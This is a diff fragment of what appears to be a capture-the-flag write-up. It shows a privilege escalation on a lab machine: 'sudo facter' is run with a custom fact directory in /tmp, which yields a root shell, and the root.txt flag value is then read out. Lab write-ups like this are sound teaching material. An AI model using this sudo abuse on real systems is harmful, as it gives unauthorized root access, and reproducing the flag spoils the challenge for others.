@@ -427,8 +427,17 @@ and save it then run this:
 
 trivia@facts:/tmp$ sudo facter -p --custom-dir=/tmp
 ^[[D[2026-02-03 10:54:34.042144 ] ERROR Facter - Could not load puppet gem, got cannot load such file -- puppet
-
+root@facts:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@facts:/tmp# cd
+root@facts:~# cd /root/
+root@facts:~# ls
+minio-binaries  ministack  root.txt  snap
+root@facts:~# cat root.txt
+f4afc2f2e3d5b188080bb07b18dd922e
 ```
+
+
 
 
 
